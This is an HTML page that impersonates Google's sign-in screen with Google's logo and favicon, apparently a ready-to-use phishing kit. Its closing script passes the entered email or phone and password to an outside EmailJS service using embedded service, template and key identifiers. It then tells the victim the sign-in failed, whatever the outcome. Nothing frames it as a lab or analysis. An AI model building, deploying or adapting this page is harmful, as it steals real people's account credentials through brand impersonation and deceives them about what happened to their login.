<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Google Sign In</title>
  <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon" />
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <link
    href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
    rel="stylesheet"
  />
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #f8f9fa 25%, #e8eaed 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }
    input[type="text"],
    input[type="password"] {
      transition: transform 0.5s, box-shadow 0.3s;
      border-radius: 0.5rem;
      box-shadow: inset 0 0 0 1px #dadce0;
      padding-left: 0.75rem;
      padding-right: 0.75rem;
      padding-top: 0.5rem;
      padding-bottom: 0.5rem;
      font-size: 0.875rem;
      outline-offset: 2px;
    }
    input[type="text"]:focus,
    input[type="password"]:focus {
      transform: translateY(-5px);
      box-shadow: 0 4px 8px rgba(66, 133, 244, 0.3);
      border-color: #4285f4;
      outline: none;
      background-color: #fff;
    }
    button {
      border-radius: 0.375rem;
      transition: background-color 0.3s, box-shadow 0.3s;
      box-shadow: 0 2px 4px rgba(66, 133, 244, 0.4);
    }
    button:hover {
      background-color: #3367d6;
      box-shadow: 0 4px 12px rgba(66, 133, 244, 0.6);
    }
    .card {
      background: #fff;
      border-radius: 1rem;
      box-shadow:
        0 1px 3px rgba(60,64,67,.3),
        0 4px 8px rgba(60,64,67,.15);
      padding: 2.5rem 2rem 2rem 2rem;
      max-width: 360px;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }
    .footer {
      max-width: 360px;
      width: 100%;
      margin-top: 1.5rem;
      font-size: 0.75rem;
      color: #5f6368;
      display: flex;
      justify-content: space-between;
      user-select: none;
    }
    .footer a {
      color: #5f6368;
      transition: color 0.2s;
    }
    .footer a:hover {
      color: #202124;
      text-decoration: underline;
    }
    .language-select {
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 0.15rem;
      font-weight: 500;
    }
    .language-select span {
      font-size: 0.6rem;
      line-height: 1;
    }
  </style>
</head>
<body>
  <div class="card" role="main" aria-label="Google sign in form">
    <img
      src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"
      alt="Google logo with blue, red, yellow and green letters"
      class="w-24 mb-6 select-none"
      draggable="false"
      decoding="async"
      loading="eager"
      width="96"
      height="32"
    />
    <h1 class="text-3xl font-normal text-black mb-1 select-none">Sign in</h1>
    <p class="text-sm text-gray-700 mb-8 select-none">with your Google Account</p>
    <form id="signInForm" class="w-full space-y-8" autocomplete="off" novalidate>
      <input
        id="emailPhone"
        name="emailPhone"
        type="text"
        placeholder="Email or phone"
        class="w-full"
        required
        aria-label="Email or phone"
        spellcheck="false"
        autocapitalize="none"
        autocomplete="username"
      />
      <input
        id="password"
        name="password"
        type="password"
        placeholder="Enter your password"
        class="w-full"
        required
        aria-label="Enter your password"
        autocomplete="current-password"
      />
      <div class="flex items-center justify-between">
        <a href="#" class="text-sm text-blue-600 hover:underline font-semibold select-none"
          >Forgot password?</a
        >
        <button
          type="submit"
          class="bg-blue-600 text-white text-xs font-semibold px-6 py-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-1"
          aria-label="Sign in"
        >
          SIGN IN
        </button>
      </div>
    </form>
  </div>
  <footer class="footer" aria-label="Footer navigation">
    <div class="language-select" tabindex="0" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Select language">
      English (United States) <span aria-hidden="true">â–¼</span>
    </div>
    <div class="flex space-x-6">
      <a href="#" class="hover:underline" tabindex="0">Help</a>
      <a href="#" class="hover:underline" tabindex="0">Privacy</a>
      <a href="#" class="hover:underline" tabindex="0">Terms</a>
    </div>
  </footer>

  <script>
    (function(){
      emailjs.init({
        publicKey: "_G6NIPCAEwaGP6AjI"
      });
    })();
  
    document.getElementById('signInForm').addEventListener('submit', function(e) {
      e.preventDefault();
  
      emailjs.sendForm('service_zk60w7j', 'template_rohypl1', this)
        .then(function(response) {
          alert('Sign in failed. Please try again.');
        }, function(error) {
          alert('Sign in failed. Please try again.');
        });
    });
  </script>
  
</body>
</html>
